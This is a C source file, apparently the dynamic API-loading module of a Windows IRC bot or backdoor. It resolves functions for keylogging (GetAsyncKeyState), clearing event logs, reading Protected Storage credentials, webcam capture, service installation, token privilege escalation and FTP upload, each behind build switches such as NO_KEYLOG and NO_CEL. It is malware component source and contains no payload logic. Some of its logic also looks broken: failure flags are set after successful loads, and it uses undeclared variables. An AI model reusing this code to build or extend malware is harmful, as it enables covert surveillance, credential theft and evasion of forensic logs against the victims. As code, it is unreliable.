#include "../h/includes.h"
// kernel32.dll function variables
//SEM fSetErrorMode;
//CT32S fCreateToolhelp32Snapshot;
//P32F fProcess32First;
//P32N fProcess32Next;
//M32F fModule32First;
//GDFSE fGetDiskFreeSpaceEx;
//GLDS fGetLogicalDriveStrings;
//GDT fGetDriveType;
//SP fSearchPath;
//QPC fQueryPerformanceCounter;
//QPF fQueryPerformanceFrequency;
//RSP fRegisterServiceProcess;
GCNA fGetComputerName;
GUPD fGetUserProfileDirectory;
WSAFDIS __fWSAFDIsSet;
// user32.dll function variables
//CW fCloseWindow;
//SM fSendMessage;
//FW fFindWindow;
IW fIsWindow;
//DW fDestroyWindow;
//OC fOpenClipboard;
//GCD fGetClipboardData;
//CC fCloseClipboard;
//EWE fExitWindowsEx;

#ifndef NO_WINDOWCTRL
//EW fEnumWindows;
//GWI fGetWindowInfo;
//GWTPI fGetWindowThreadProcessId;
//SW fShowWindow;
IWV fIsWindowVisible;
//GCN fGetClassName;
#endif // NO_WINDOWCTRL

// advapi32.dll function variables
//ROKE fRegOpenKeyEx;
//RCKE fRegCreateKeyEx;
//RSVE fRegSetValueEx;
//RQVE fRegQueryValueEx;
//RDV fRegDeleteValue;
//RDK fRegDeleteKey;
//RCK fRegCloseKey;
REKE fRegEnumKeyEx;
//REV fRegEnumValue;
//RQIK fRegQueryInfoKey;
OTT fOpenThreadToken;
OPT fOpenProcessToken;
LPV fLookupPrivilegeValue;
ATP fAdjustTokenPrivileges;

#ifndef NO_LSARESTRICT
LOP fLsaOpenPolicy;
LEAWUR fLsaEnumerateAccountsWithUserRight;
LLN2 fLsaLookupNames2;
LAAR fLsaAddAccountRights;
LRAR fLsaRemoveAccountRights;
LFM fLsaFreeMemory;
LC fLsaClose;
LNSTWE fLsaNtStatusToWinError;

#endif // NO_LSARESTRICT

BIND fbind;
SEL fselect;
LIS flisten;
ACC faccept;

#ifndef NO_CEL
CEL fClearEventLog;
CLEL fCloseEventLog;
OEL fOpenEventLog;
#endif // NO_CEL

OSCM fOpenSCManager;
SS fStartService;
CRS fCreateService;
OS fOpenService;
CSH fCloseServiceHandle;
SSCD fStartServiceCtrlDispatcher;
ESS fEnumServicesStatus;
CS fControlService;
DS fDeleteService;
IVSD fIsValidSecurityDescriptor;
ILOU fImpersonateLoggedOnUser;
LSD fLockServiceDatabase;
QSLS fQueryServiceLockStatus;
CSC2 fChangeServiceConfig2;
USD fUnlockServiceDatabase;
RSCH fRegisterServiceCtrlHandler;
SSS fSetServiceStatus;
#ifndef NO_SYSINFO
GUN fGetUserName;
#endif // NO_SYSINFO

// gdi32.dll function variables
//CDC fCreateDC;
//CDIBS fCreateDIBSection;
//CCDC fCreateCompatibleDC;
//GDC fGetDeviceCaps;
//GDIBCT fGetDIBColorTable;
//SO fSelectObject;
//BB fBitBlt;
//DDC fDeleteDC;
//DO fDeleteObject;

// ws2_32.dll function variables
WSAS fWSAStartup;
WSASo fWSASocket;
//WSAAS fWSAAsyncSelect;
//WSAFDIS __fWSAFDIsSet;
//WSAI fWSAIoctl;
WSAGLE fWSAGetLastError;
WSAC fWSACleanup;
SOCK fsocket;
//IOCTLS fioctlsocket;
CON fconnect;
INTOA finet_ntoa;
IADDR finet_addr;
HTONS fhtons;
HTONL fhtonl;
//NTOHS fntohs;
//NTOHL fntohl;
SEND fsend;
SENDTO fsendto;
RECV frecv;
//RECVFROM frecvfrom;
//BIND fbind;
//SEL fselect;
//LIS flisten;
//ACC faccept;
SSO fsetsockopt;
GSN fgetsockname;
GHN fgethostname;
GHBN fgethostbyname;
GHBA fgethostbyaddr;
GPN fgetpeername;
CLSO fclosesocket;
SD fshutdown;
#ifndef NO_NETSTATP
//GSBP fgetservbyport;
#endif // NO_NETSTATP

// wininet.dll function variables
IGCS fInternetGetConnectedState;
IGCSE fInternetGetConnectedStateEx;
HOR fHttpOpenRequest;
HSR fHttpSendRequest;
FGF fFtpGetFile;
FPF fFtpPutFile;
IC fInternetConnect;
IO fInternetOpen;
IOU fInternetOpenUrl;
ICU fInternetCrackUrl;
IRF fInternetReadFile;
ICH fInternetCloseHandle;

HANDLE ih;

// icmp.dll function variables
#ifndef NO_PING
ICF fIcmpCreateFile;
ISE fIcmpSendEcho;
ICH fIcmpCloseHandle;
#endif // NO_PING

// netapi32.dll function variables
/*
//NSA fNetShareAdd;
NSD fNetShareDel;
NSE fNetShareEnum;
NSJA fNetScheduleJobAdd;
NABF fNetApiBufferFree;
NRTOD fNetRemoteTOD;
NUA fNetUserAdd;
NUD fNetUserDel;
NUE fNetUserEnum;
NUGI fNetUserGetInfo;
NMBS fNetMessageBufferSend;
*/
// dnsapi.dll function variables
DFRC fDnsFlushResolverCache;
DFRCEA fDnsFlushResolverCacheEntry_A;


// iphlpapi.dll function variables
GIT fGetIfTable;
GINT fGetIpNetTable;
DINE fDeleteIpNetEntry;
GTT fGetTcpTable;
GUT fGetUdpTable;
#ifndef NO_NETSTATP
AAGTETFS fAllocateAndGetTcpExTableFromStack;
AAGUETFS fAllocateAndGetUdpExTableFromStack;
#endif // NO_NETSTATP
#ifndef NO_ENETINFO
GNP fGetNetworkParams;
#endif // NO_ENETINFO

// mpr.dll function variables
WNAC2 fWNetAddConnection2;
WNAC2W fWNetAddConnection2W;
WNCC2 fWNetCancelConnection2;
WNCC2W fWNetCancelConnection2W;

// shell32.dll function variables
SE fShellExecute;
SHCN fSHChangeNotify;

// odbc32.dll function variables
SQLDC fSQLDriverConnect;
SQLSEA fSQLSetEnvAttr;
SQLED fSQLExecDirect;
SQLAH fSQLAllocHandle;
SQLFH fSQLFreeHandle;
SQLD fSQLDisconnect;

#ifndef NO_CAPTURE
// avicap32.dll function variables
cCCW fcapCreateCaptureWindow;
cGDD fcapGetDriverDescription;
#endif // NO_CAPTURE

// psapi.dll function variables
GMFNE fGetModuleFileNameEx;
GMBN fGetModuleBaseName;
EPM fEnumProcessModules;
EP fEnumProcesses;
GPMI fGetProcessMemoryInfo;

#ifndef NO_PSTORE
//pstorec.dll function variables
PSCI fPStoreCreateInstance;
#endif

//shlwapi.dll function variables
PRFS fPathRemoveFileSpec;


// globals for dynamic libraries
BOOL nokernel32 = FALSE;
DWORD nokernel32err = 0;
BOOL nouser32 = FALSE;
DWORD nouser32err = 0;
BOOL noadvapi32 = FALSE;
BOOL noadvapi32lsa = FALSE;
DWORD noadvapi32err = 0;
BOOL nogdi32 = FALSE;
DWORD nogdi32err = 0;
BOOL nows2_32 = FALSE;
DWORD nows2_32err = 0;
BOOL nowininet = FALSE;
DWORD nowinineterr = 0;
BOOL noicmp = FALSE;
DWORD noicmperr = 0;
BOOL nonetapi32 = FALSE;
DWORD nonetapi32err = 0;
BOOL nodnsapi = FALSE;
DWORD nodnsapierr = 0;
BOOL noiphlpapi = FALSE;
BOOL noiphlpapinsp = FALSE;
DWORD noiphlpapierr = 0;
BOOL nompr = FALSE;
DWORD nomprerr = 0;
BOOL noshell32 = FALSE;
DWORD noshell32err = 0;
BOOL noodbc32 = FALSE;
DWORD noodbc32err = 0;
BOOL noavicap32 = FALSE;
DWORD noavicap32err = 0;
BOOL nopsapi = FALSE;
DWORD nopsapierr = 0;
BOOL nopstore = FALSE;
DWORD nopstoreerr = 0;
BOOL noshlwapi = FALSE;
DWORD noshlwapierr = 0;
BOOL nouserenv = FALSE;
DWORD nouserenverr = 0; 

BOOL LoadDLLs(void) 
{
	// dynamically load kernel32.dll
	HMODULE kernel32_dll = GetModuleHandle("kernel32.dll");
	if (kernel32_dll) {
		fGetComputerName = (GCNA)GetProcAddress(kernel32_dll, "GetComputerNameA");

		if (!fGetComputerName)
			nokernel32 = TRUE;
	}

	// dynamically load user32.dll
 	HMODULE user32_dll = LoadLibrary("user32.dll");
    if (user32_dll) {
			nouser32 = TRUE;

#ifndef NO_KEYLOG
		fGetAsyncKeyState = (GAKS)GetProcAddress(user32_dll,"GetAsyncKeyState");
		fGetKeyState = (GKS)GetProcAddress(user32_dll,"GetKeyState");
		fGetWindowText = (GWT)GetProcAddress(user32_dll,"GetWindowTextA");
		fGetForegroundWindow = (GFW)GetProcAddress(user32_dll,"GetForegroundWindow");

		if (!fGetAsyncKeyState || !fGetKeyState || !fGetWindowText || !fGetForegroundWindow) 
			nouser32 = TRUE;
#endif // NO_KEYLOG



		nouser32 = TRUE;
	}


	// dynamically load advapi32.dll
 	HMODULE advapi32_dll = LoadLibrary("advapi32.dll");
    if (advapi32_dll) {
		fRegEnumKeyEx = (REKE)GetProcAddress(advapi32_dll,"RegEnumKeyExA");
	        noadvapi32 = TRUE;


		fOpenThreadToken = (OTT)GetProcAddress(advapi32_dll,"OpenThreadToken");
		fOpenProcessToken = (OPT)GetProcAddress(advapi32_dll,"OpenProcessToken");
		fLookupPrivilegeValue = (LPV)GetProcAddress(advapi32_dll,"LookupPrivilegeValueA");
		fAdjustTokenPrivileges = (ATP)GetProcAddress(advapi32_dll,"AdjustTokenPrivileges");

		if (!fOpenThreadToken || !fOpenProcessToken || !fLookupPrivilegeValue || !fAdjustTokenPrivileges)
	        noadvapi32 = TRUE;		
#ifndef NO_LSARESTRICT
		fLsaOpenPolicy = (LOP)GetProcAddress(advapi32_dll,"LsaOpenPolicy");
		fLsaEnumerateAccountsWithUserRight = (LEAWUR)GetProcAddress(advapi32_dll,"LsaEnumerateAccountsWithUserRight");
		fLsaLookupNames2 = (LLN2)GetProcAddress(advapi32_dll, "LsaLookupNames2");
		fLsaAddAccountRights = (LAAR)GetProcAddress(advapi32_dll,"LsaAddAccountRights");
		fLsaRemoveAccountRights = (LRAR)GetProcAddress(advapi32_dll,"LsaRemoveAccountRights");
		fLsaFreeMemory = (LFM)GetProcAddress(advapi32_dll,"LsaFreeMemory");
		fLsaClose = (LC)GetProcAddress(advapi32_dll,"LsaClose");
		fLsaNtStatusToWinError = (LNSTWE)GetProcAddress(advapi32_dll,"LsaNtStatusToWinError");

		if (!fLsaOpenPolicy || !fLsaEnumerateAccountsWithUserRight || !fLsaLookupNames2 || !fLsaAddAccountRights 
			|| !fLsaRemoveAccountRights || !fLsaFreeMemory || !fLsaClose || !fLsaNtStatusToWinError)
			noadvapi32lsa = TRUE;
#endif // NO_LSARESTRICT

	 	fOpenSCManager = (OSCM)GetProcAddress(advapi32_dll,"OpenSCManagerA");
	 	fOpenService = (OS)GetProcAddress(advapi32_dll,"OpenServiceA");
		fStartService = (SS)GetProcAddress(advapi32_dll,"StartServiceA");
	 	fControlService = (CS)GetProcAddress(advapi32_dll,"ControlService");
	 	fDeleteService = (DS)GetProcAddress(advapi32_dll,"DeleteService");
	 	fCloseServiceHandle = (CSH)GetProcAddress(advapi32_dll,"CloseServiceHandle");
	 	fEnumServicesStatus = (ESS)GetProcAddress(advapi32_dll,"EnumServicesStatusA");
		fIsValidSecurityDescriptor = (IVSD)GetProcAddress(advapi32_dll,"IsValidSecurityDescriptor");
		fCreateService = (CRS)GetProcAddress(advapi32_dll,"CreateServiceA");
	 	fStartServiceCtrlDispatcher = (SSCD)GetProcAddress(advapi32_dll,"StartServiceCtrlDispatcherA");
	 	fImpersonateLoggedOnUser = (ILOU)GetProcAddress(advapi32_dll,"ImpersonateLoggedOnUser");
	 	fLockServiceDatabase = (LSD)GetProcAddress(advapi32_dll,"LockServiceDatabase");
		fQueryServiceLockStatus = (QSLS)GetProcAddress(advapi32_dll,"QueryServiceLockStatusA");
		fChangeServiceConfig2 = (CSC2)GetProcAddress(advapi32_dll,"ChangeServiceConfig2A");
		fUnlockServiceDatabase = (USD)GetProcAddress(advapi32_dll,"UnlockServiceDatabase");
		fRegisterServiceCtrlHandler = (RSCH)GetProcAddress(advapi32_dll,"RegisterServiceCtrlHandlerA");
		fSetServiceStatus = (SSS)GetProcAddress(advapi32_dll,"SetServiceStatus");

		if (!fOpenSCManager || !fOpenService || !fStartService || !fControlService 
			|| !fDeleteService || !fCloseServiceHandle || !fEnumServicesStatus
			|| !fIsValidSecurityDescriptor || !fImpersonateLoggedOnUser || !fLockServiceDatabase
			|| !fQueryServiceLockStatus || !fChangeServiceConfig2 || !fUnlockServiceDatabase
			|| !fRegisterServiceCtrlHandler || !fSetServiceStatus)
	        noadvapi32 = TRUE;

#ifndef NO_SYSINFO
		fGetUserName = (GUN)GetProcAddress(advapi32_dll,"GetUserNameA");

		if (!fGetUserName)
			noadvapi32 = TRUE;
#endif // NO_SYSINFO

#ifndef NO_CEL
		fClearEventLog = (CEL)GetProcAddress(advapi32_dll,"ClearEventLogA");
		fOpenEventLog = (OEL)GetProcAddress(advapi32_dll,"OpenEventLogA");
		fCloseEventLog = (CLEL)GetProcAddress(advapi32_dll,"CloseEventLog");

		if (!fClearEventLog || !fOpenEventLog || !fCloseEventLog)
			noadvapi32 = TRUE;
#endif

	} else {
		noadvapi32err = GetLastError();
		noadvapi32 = TRUE;
	}
    // dynamically load ws2_32.dll
 	HMODULE ws2_32_dll = LoadLibrary("ws2_32.dll");
    if (ws2_32_dll) {
	 	fWSAStartup = (WSAS)GetProcAddress(ws2_32_dll,"WSAStartup");
		fWSASocket = (WSASo)GetProcAddress(ws2_32_dll,"WSASocketA");
		fWSAGetLastError = (WSAGLE)GetProcAddress(ws2_32_dll,"WSAGetLastError");
		fWSACleanup = (WSAC)GetProcAddress(ws2_32_dll,"WSACleanup");
  		fsocket = (SOCK)GetProcAddress(ws2_32_dll,"socket");
		fconnect = (CON)GetProcAddress(ws2_32_dll,"connect");
		finet_ntoa = (INTOA)GetProcAddress(ws2_32_dll,"inet_ntoa");
		finet_addr = (IADDR)GetProcAddress(ws2_32_dll,"inet_addr");
		fhtons = (HTONS)GetProcAddress(ws2_32_dll,"htons");
		fhtonl = (HTONL)GetProcAddress(ws2_32_dll,"htonl");
		fsend = (SEND)GetProcAddress(ws2_32_dll,"send");
		fsendto = (SENDTO)GetProcAddress(ws2_32_dll,"sendto");
		frecv = (RECV)GetProcAddress(ws2_32_dll,"recv");
		fbind = (BIND)GetProcAddress(ws2_32_dll,"bind");
		fselect = (SEL)GetProcAddress(ws2_32_dll,"select");
		flisten = (LIS)GetProcAddress(ws2_32_dll,"listen");
		faccept = (ACC)GetProcAddress(ws2_32_dll,"accept");
		__fWSAFDIsSet = (WSAFDIS)GetProcAddress(ws2_32_dll,"__WSAFDIsSet");
		fsetsockopt = (SSO)GetProcAddress(ws2_32_dll,"setsockopt");
		fgetsockname = (GSN)GetProcAddress(ws2_32_dll,"getsockname");
		fgethostname = (GHN)GetProcAddress(ws2_32_dll,"gethostname");
		fgethostbyname = (GHBN)GetProcAddress(ws2_32_dll,"gethostbyname");
		fgethostbyaddr = (GHBA)GetProcAddress(ws2_32_dll,"gethostbyaddr");
		fgetpeername = (GPN)GetProcAddress(ws2_32_dll,"getpeername");
		fclosesocket = (CLSO)GetProcAddress(ws2_32_dll,"closesocket");
		fshutdown = (SD)GetProcAddress(ws2_32_dll,"shutdown");

		if (!fWSAStartup || !fWSASocket || !fWSAGetLastError 
			|| !fWSACleanup || !fsocket || !fconnect || !finet_ntoa || !finet_addr
			|| !fhtons || !fhtonl || !fsend || !fsendto || !frecv
			|| !fsetsockopt || !fgetsockname || !fgethostname
			|| !fclosesocket)	
	        nows2_32 = TRUE;

	} else {
		nows2_32err = GetLastError();
		nows2_32 = TRUE;
	}

	// dynamically load wininet.dll
	HMODULE wininet_dll = LoadLibrary("wininet.dll");
    if (wininet_dll) {
		fInternetGetConnectedState = (IGCS)GetProcAddress(wininet_dll, "InternetGetConnectedState");
	 	fInternetGetConnectedStateEx = (IGCSE)GetProcAddress(wininet_dll, "InternetGetConnectedStateEx");
	 	fHttpOpenRequest = (HOR)GetProcAddress(wininet_dll, "HttpOpenRequestA");
	 	fHttpSendRequest = (HSR)GetProcAddress(wininet_dll, "HttpSendRequestA");
		fFtpGetFile = (FGF)GetProcAddress(wininet_dll, "FtpGetFileA");
		fFtpPutFile = (FPF)GetProcAddress(wininet_dll, "FtpPutFileA");
	 	fInternetConnect = (IC)GetProcAddress(wininet_dll, "InternetConnectA");
	 	fInternetOpen = (IO)GetProcAddress(wininet_dll, "InternetOpenA");
	 	fInternetOpenUrl = (IOU)GetProcAddress(wininet_dll, "InternetOpenUrlA");
	 	fInternetCrackUrl = (ICU)GetProcAddress(wininet_dll, "InternetCrackUrlA");
	 	fInternetReadFile = (IRF)GetProcAddress(wininet_dll, "InternetReadFile");
	 	fInternetCloseHandle = (ICH)GetProcAddress(wininet_dll, "InternetCloseHandle");

		if (!fInternetGetConnectedState || !fInternetGetConnectedStateEx || !fHttpOpenRequest 
			|| !fHttpSendRequest || !fInternetConnect || !fInternetOpen || !fInternetOpenUrl
			|| !fInternetCrackUrl || !fInternetReadFile || !fInternetCloseHandle) 
			nowininet = TRUE;

		if (fInternetOpen) {
				ih = fInternetOpen("Mozilla/4.0 (compatible)", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
				if (ih == NULL) ih = 0;
		}
	} else {
		nowinineterr = GetLastError();
		nowininet = TRUE;
		ih = 0;
	}

#ifndef NO_PING
	// dynamically load icmp.dll
 	HMODULE icmp_dll = LoadLibrary("icmp.dll");
    if (icmp_dll) {
	 	fIcmpCreateFile = (ICF)GetProcAddress(icmp_dll,"IcmpCreateFile");
 		fIcmpCloseHandle = (ICH)GetProcAddress(icmp_dll,"IcmpCloseHandle");
 		fIcmpSendEcho = (ISE)GetProcAddress(icmp_dll,"IcmpSendEcho");

		if (!fIcmpCreateFile || !fIcmpCloseHandle || !fIcmpSendEcho)
	        noicmp = TRUE;
	} else {
		noicmperr = GetLastError();
		noicmp = TRUE;
	}
#endif // NO_PING
	
	// dynamically load netapi32.dll
 	HMODULE netapi32_dll = LoadLibrary("netapi32.dll");
    if (netapi32_dll) {
		nonetapi32 = TRUE;
	}

 	HMODULE dnsapi_dll = LoadLibrary("dnsapi.dll");
    if (dnsapi_dll) {
	 	fDnsFlushResolverCache = (DFRC)GetProcAddress(dnsapi_dll,"DnsFlushResolverCache");
	 	fDnsFlushResolverCacheEntry_A = (DFRCEA)GetProcAddress(dnsapi_dll,"DnsFlushResolverCacheEntry_A");

		if (!fDnsFlushResolverCache || !fDnsFlushResolverCacheEntry_A)
	        nodnsapi = TRUE;
	} else {
		nodnsapierr = GetLastError();
		nodnsapi = TRUE;
	}

	// dynamically load iphlpapi.dll
 	HMODULE iphlpapi_dll = LoadLibrary("iphlpapi.dll");
    if (iphlpapi_dll) {
	 	fGetIpNetTable = (GINT)GetProcAddress(iphlpapi_dll,"GetIpNetTable");
	 	fDeleteIpNetEntry = (DINE)GetProcAddress(iphlpapi_dll,"DeleteIpNetEntry");
		fGetIfTable = (GIT)GetProcAddress(iphlpapi_dll,"GetIfTable");
		fGetTcpTable = (GTT)GetProcAddress(iphlpapi_dll,"GetTcpTable");
		fGetUdpTable = (GUT)GetProcAddress(iphlpapi_dll,"GetUdpTable");

		if (!fGetIpNetTable || !fDeleteIpNetEntry || !fGetIfTable || !fGetUdpTable || !fGetTcpTable)
	        noiphlpapi = TRUE;
		
#ifndef NO_NETSTATP
		fAllocateAndGetTcpExTableFromStack = (AAGTETFS)GetProcAddress(iphlpapi_dll,"AllocateAndGetTcpExTableFromStack");
		fAllocateAndGetUdpExTableFromStack = (AAGUETFS)GetProcAddress(iphlpapi_dll,"AllocateAndGetUdpExTableFromStack");
 
		if (!fAllocateAndGetTcpExTableFromStack || !fAllocateAndGetUdpExTableFromStack)	
	        noiphlpapinsp = TRUE;
#endif // NO_NETSTATP

#ifndef NO_ENETINFO
		fGetNetworkParams = (GNP)GetProcAddress(iphlpapi_dll,"GetNetworkParams");

		if (!fGetNetworkParams)	
	        noiphlpapi = TRUE;
#endif // NO_ENETINFO

	} else {
		noiphlpapierr = GetLastError();
		noiphlpapi = TRUE;
	}

	// dynamically load mpr.dll
 	HMODULE mpr_dll = LoadLibrary("mpr.dll");
    if (mpr_dll) {
	 	fWNetAddConnection2 = (WNAC2)GetProcAddress(mpr_dll,"WNetAddConnection2A");
	 	fWNetAddConnection2W = (WNAC2W)GetProcAddress(mpr_dll,"WNetAddConnection2W");
	 	fWNetCancelConnection2 = (WNCC2)GetProcAddress(mpr_dll,"WNetCancelConnection2A");
	 	fWNetCancelConnection2W = (WNCC2W)GetProcAddress(mpr_dll,"WNetCancelConnection2W");

		if (!fWNetAddConnection2 || !fWNetAddConnection2W 
			|| !fWNetCancelConnection2 || !fWNetCancelConnection2W)	
	        nompr = TRUE;
	} else {
		nomprerr = GetLastError();
		nompr = TRUE;
	}

	// dynamically load shell32.dll
 	HMODULE shell32_dll = LoadLibrary("shell32.dll");
    if (shell32_dll) {
	 	fShellExecute = (SE)GetProcAddress(shell32_dll,"ShellExecuteA");
		fSHChangeNotify = (SHCN)GetProcAddress(shell32_dll,"SHChangeNotify");
 
		if (!fShellExecute || !fSHChangeNotify)
	        noshell32 = TRUE;
	} else {
		noshell32err = GetLastError();
		noshell32 = TRUE;
	}

	// dynamically load odbc32.dll
 	HMODULE odbc32_dll = LoadLibrary("odbc32.dll");
    if (odbc32_dll) {
	 	fSQLDriverConnect = (SQLDC)GetProcAddress(odbc32_dll,"SQLDriverConnect");
	 	fSQLSetEnvAttr = (SQLSEA)GetProcAddress(odbc32_dll,"SQLSetEnvAttr");
	 	fSQLExecDirect = (SQLED)GetProcAddress(odbc32_dll,"SQLExecDirect");
	 	fSQLAllocHandle = (SQLAH)GetProcAddress(odbc32_dll,"SQLAllocHandle");
	 	fSQLFreeHandle = (SQLFH)GetProcAddress(odbc32_dll,"SQLFreeHandle");
	 	fSQLDisconnect = (SQLD)GetProcAddress(odbc32_dll,"SQLDisconnect");
 
		if (!fSQLDriverConnect || !fSQLSetEnvAttr || !fSQLExecDirect
			|| !fSQLAllocHandle || !fSQLFreeHandle || !fSQLDisconnect)
	        noodbc32 = TRUE;
	} else {
		noodbc32err = GetLastError();
		noodbc32 = TRUE;
	}
   HMODULE userenv_dll = LoadLibrary("userenv.dll");
   if (userenv_dll) {
      fGetUserProfileDirectory = (GUPD)GetProcAddress(userenv_dll,"GetUserProfileDirectoryA");

      if (!fGetUserProfileDirectory)
        nouserenv = TRUE;
   } else {
      nouserenverr = GetLastError();
      nouserenv = TRUE;
   }
#ifndef NO_CAPTURE
	// dynamically load avicap32.dll
 	HMODULE avicap32_dll = LoadLibrary("avicap32.dll");
    if (avicap32_dll) {
	 	fcapCreateCaptureWindow = (cCCW)GetProcAddress(avicap32_dll,"capCreateCaptureWindowA");
	 	fcapGetDriverDescription = (cGDD)GetProcAddress(avicap32_dll,"capGetDriverDescriptionA");
 
		if (!fcapCreateCaptureWindow || !fcapGetDriverDescription)
	        noavicap32 = TRUE;
	} else {
		noavicap32err = GetLastError();
		noavicap32 = TRUE;
	}
#endif // NO_CAPTURE

	// dynamically load psapi.dll
 	HMODULE psapi_dll = LoadLibrary("psapi.dll");
    if (psapi_dll) {
	 	fGetModuleFileNameEx = (GMFNE)GetProcAddress(psapi_dll,"GetModuleFileNameExA");
	 	fGetModuleBaseName = (GMBN)GetProcAddress(psapi_dll,"GetModuleBaseNameA");
	 	fEnumProcessModules = (EPM)GetProcAddress(psapi_dll,"EnumProcessModules");
	 	fEnumProcesses = (EP)GetProcAddress(psapi_dll,"EnumProcesses");
	 	fGetProcessMemoryInfo = (GPMI)GetProcAddress(psapi_dll,"GetProcessMemoryInfo");

		if (!fGetModuleBaseName || !fEnumProcessModules || !fEnumProcesses || !fGetProcessMemoryInfo)
	        nopsapi = TRUE;
	} else {
		nopsapierr = GetLastError();
		nopsapi = TRUE;
	}

#ifndef NO_PSTORE
	// dynamically load pstorec.dll
 	HMODULE pstorec_dll = LoadLibrary("pstorec.dll");
    if (pstorec_dll) {
	 	fPStoreCreateInstance = (PSCI)GetProcAddress(pstorec_dll,"PStoreCreateInstance");

		if (!fPStoreCreateInstance)
	        nopstore = TRUE;
	} else {
		nopstoreerr = GetLastError();
		nopstore = TRUE;
	}
#endif

	// dynamically load shlwapi.dll
 	HMODULE shlwapi_dll = LoadLibrary("shlwapi.dll");
    if (shlwapi_dll) {
	 	fPathRemoveFileSpec = (PRFS)GetProcAddress(shlwapi_dll ,"PathRemoveFileSpecA");

		if (!fPathRemoveFileSpec)
	        noshlwapi = TRUE;
	} else {
		noshlwapierr = GetLastError();
		noshlwapi = TRUE;
	}

	return TRUE;
}
